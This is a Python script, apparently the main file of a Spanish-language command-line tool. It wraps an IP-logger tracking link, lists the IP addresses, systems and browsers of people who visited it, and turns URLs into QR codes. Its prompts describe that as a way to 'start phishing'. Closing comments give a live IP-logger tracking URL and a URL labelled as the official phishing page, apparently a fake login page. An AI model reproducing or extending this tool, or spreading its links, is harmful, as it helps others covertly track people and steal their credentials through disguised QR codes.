import color
import importlib
import logger
import main
import os
import random
import requests
import sys
import time
import qr

from colorama import just_fix_windows_console, Fore, Style, Back
from os import system

# URL
# https://iplogger.org/es/logger/R2w94VmM9RNv



#MODULO from OS import SYSTEM:
pwd = os.getcwd()
#-----------------

# MODULO RANDOM: 
reseting_dial = ['Estamos trabajando para usted ... RECONFIGURANDO !!', 'Tu cambio de URL puede demorar un poco ... ', 'En unos instantes estaremos listos!']
reseting_rand = reseting_dial[random.randint(0, 2)]
#----------

#MODULO COLORAMA:   
red  = Fore.RED + Style.BRIGHT
purp = Fore.MAGENTA  + Style.BRIGHT
cyan = Fore.CYAN + Style.BRIGHT
yell = Fore.YELLOW + Style.BRIGHT
blue = Fore.BLUE + Style.BRIGHT
back_yell = Fore.BLACK + Style.BRIGHT + Back.YELLOW 
green= Fore.GREEN + Style.BRIGHT
#---------------------------------------------------

system('cls')
color.intro()


# Esto es el output de help, deberíamos ponerlo en una función

def help_():
	help_ = f'''

{yell}-targ{cyan} = {purp}Una vez dado {yell}[ENTER]{purp} te abrirá un Output para ingresar tu link, con el cual puedes 
	colocar tu URL de seguimiento del ipLogger, este puede ser un enlace del mismo o 
	puesto desde un dominio tuyo. 

{yell}-show {cyan} = {purp}Muestra las direcciones que han ingresado al ipLogger con sus respectivos
		Sistemas operativos y versiones de navegador. 

{yell}-makeQr{cyan} = {purp} Se abre un input para crear un QR en base a un link específico. 

'''
	print(help_)
print(f'{blue}\nColoca -help para obtener los comandos. ')
#-----------------------------------------------------------------------




def reset_mod(mod_name):
    if mod_name in sys.modules:
    	importlib.reload(sys.modules[mod_name])



#reset = 0
def control():
	reset = 0 
	while True:
		
		print(f'{red}Target URL:{cyan} {logger.website} \n |')
		ing = input(f' |_{purp}[FrntYrd >_ :{cyan}')

	#condiciones del input
		if ing == '-help':
			help_()

		if ing == 'credits':
			color.credits()

		if ing == '-targ':
			try:
				verif = 0
				print(f'{cyan}\n[*] De preferencia un link de seguimiento de ipLogger')
				ingtarg = input(f'{red}[Target]:{cyan}')

				verif = requests.get(ingtarg)
				print(verif)

				if verif != 0:
					with open('url.dat', 'w') as archivo:
						archivo.flush()
						archivo.write(ingtarg)
						archivo.flush()
						#|testing area| 
						#reset = 1
						#reseteo(1)

					print(f'\n[*] {back_yell}{reseting_rand}{Style.RESET_ALL}') 
					
					time.sleep(1)
					importlib.reload(logger)
					#print(f'Dentro de URL.dat \n{logger.url}')
					
					#logger.website = ingtarg	
					#print(logger.website)
		
			except:
				continue	


		if ing == '-print':
			print(logger.website)



		if ing == '-show':
			importlib.reload(logger)
			logger.salida()


		if ing == '-reset':
			main.reset_mod(logger)
		
		
		if ing == '-makeQr':
			while True:
				importlib.reload(qr)
				print(' |')
				print(f' {cyan}|_Ingresa {red}tu URL{cyan} para comenzar a pescar {purp}>:) \n | \n |_ Posteriormente puedes colocar -show para abrir tu Qr.')
				try:
					print(f' |_URL en Qr: {qr.link}')
					ingQr = input(f'\n{blue}[QrMaker]: ')

					verif_get = requests.get(ingQr)
					verif_response = str(verif_get)
					print(verif_response)
					
					if verif_response == '<Response [200]>':
						importlib.reload(qr)
						qr.make_qr(ingQr)
						print(f'{back_yell}Tu código Qr se generó en esta ruta:\n {pwd} {Style.RESET_ALL} {green} \nFigura como qr_ready.png\n ')		
						with open ('qr_link.dat', 'w') as archivo:
							archivo.write(ingQr)

				except:
					pass

				if ingQr == 'exit':
					break


				if ingQr == '-show':
					system('.\qr_ready.png')

			


			#qr.make_qr(logger.website)
			#print(f'{back_yell}Tu código Qr se generó en esta ruta:\n {pwd} {Style.RESET_ALL} {green} \nFigura como qr_ready.png\n ')
			


		if ing == 'break':
			break


#codigo oficial de trackeo: https://iplogger.org/es/logger/rXRq4V9q8vba/

#codigo phishing oficial: https://yip.su/aiep_promo_login-html